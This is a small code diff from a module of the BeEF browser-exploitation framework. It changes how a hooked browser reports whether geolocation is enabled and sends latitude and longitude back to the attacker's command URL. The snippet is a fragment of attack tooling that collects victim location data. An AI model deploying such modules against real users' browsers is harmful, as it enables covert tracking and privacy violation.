@@ -1,7 +1,7 @@
 beef.execute(function() {
 
     if(!beef.geolocation.isGeolocationEnabled()){
-        beef.net.sendback("<%= @command_url %>", <%= @command_id %>, "geoLocEnabled=FALSE&latitude=&longitude=");
+        beef.net.send("<%= @command_url %>", <%= @command_id %>, "geoLocEnabled=FALSE&latitude=&longitude=");
 		return;
     }
 
